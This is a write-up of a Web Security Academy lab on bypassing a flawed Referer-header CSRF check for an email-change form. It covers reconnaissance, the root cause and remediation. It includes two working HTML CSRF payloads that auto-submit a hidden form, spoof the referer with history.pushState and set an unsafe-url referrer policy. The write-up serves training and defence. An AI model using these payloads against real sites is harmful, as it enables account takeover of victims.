## Vulnerability Summary

The app's email change functionality is vulnerable to Cross-site Request Forgery (CSRF). It attempts to block CSRF attack by using the `Referer` header to verify that the request originated from the app's own domain and block cross-domain requests, but this detection mechanism is flawed as it only checks if the expected domain existed in the string, not if that's really the domain of the request's origin. Thus, we can bypass this mechanism and perform requests using the victim's authenticated session.
## Reconnaissance

- After logging in with the provided credentials `wiener - peter`, observe that there is a header `Cookie: session=random-token`. 
- Try deleting this `Cookie` header, or changing the value of the parameter `session` inside it and sending the request will result in a `302 Found` HTTP Response, signifying a redirection. When we follow this redirection, we get a `200 OK` HTTP Response but **logged out** of our account. However, when the `Cookie` header with its previous correct `session` value is put back into the request, we are logged in again.
This confirms that the app solely relies on this `Cookie` header for session handling, using it to identify the user who has made the requests. 
- The request to changing our email address is, by default, `POST /my-account/change-email`, with, the existence of the `Cookie` header and the parameter `email`, with the value being the email address we are changing to. There is no CSRF token implemented. Try changing the `Referer` header to a random value like `Referer: https://example.com` results in a `400 Bad Request` HTTP Response that reads `"Invalid referer header"`.
- However, when we try to include the original domain as data (`https://example.com?lab-id.web-security-academy.net/my-account?id=wiener`), the request works and we are able to change the account's email.
- With this info, we can use Burp Professional to craft a CSRF PoC like so:
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="uia&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?lab-id.web-security-academy.net'); <!-- includes the original domain in the address bar -->
      document.forms[0].submit();
    </script>
  </body>
</html>
```
- However, when we store and test this payload with View exploit, it doesn't work, as we get a `400 Bad Request` HTTP Response that reads `"Invalid referer header"` again. This is because many browsers now strip the query string from the `Referer` header by default. In order to override this behavior, we have to use `Referrer-Policy: unsafe-url`. This sends the origin, path, and query string when performing any request.

## Payload Used

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="uia&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?lab-id.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
The payload forces the authenticated victim's browser to execute a state changing action, which in this case is the email changing functionality at the `/my-account/change-email` endpoint. The input field is hidden to make the page appears as normal, `<input type="submit" value="Submit request" />` if the victim's browser has JavaScript disabled (not applicable in this case). We configure the HTTP response header `Referrer-Policy` to be `unsafe-url` to ensure that the full URL is included in the request. Then, `history.pushState('', '', '/?lab-id.web-security-academy.net');` appends the original domain to bypass the app's  detection mechanism. Finally, `document.forms[0].submit();` selects the first `<form>` element in the DOM and triggers its submission. 
## Root Cause

The app relies on the `Cookie` header as the sole mechanism to handle sessions and identify users. There is no other mechanism in place to validate user requests or track sessions. The anti-CSRF token is also not implemented. Although there is an attempt to prevent CSRF attacks by using the `Referer` header to verify that the request originated from the app's own domain, simply appending the original, legitimate domain to our site can bypass the validation mechanism completely. 
## Remediation

- A CSRF token must be implemented and included as a hidden field in all state-changing HTML forms (POST, PUT, DELETE). The server must validate that the token in the incoming request matches the token tied to the user's session (stored server-side) before processing the action. If no token exist where it should be, the server must deny the request.
- For high-impact state changes (e.g., email updates, password resets, account deletion), require the user to re-enter their current password or provide secondary authentication (MFA). 
- Configure the application's session cookies with the `SameSite=Lax` or `SameSite=Strict` attribute. This instructs the browser to withhold the session cookie during cross-origin requests, providing protection against CSRF attacks even if the app's `Referer` header validation or token mechanisms are bypassed or absent.
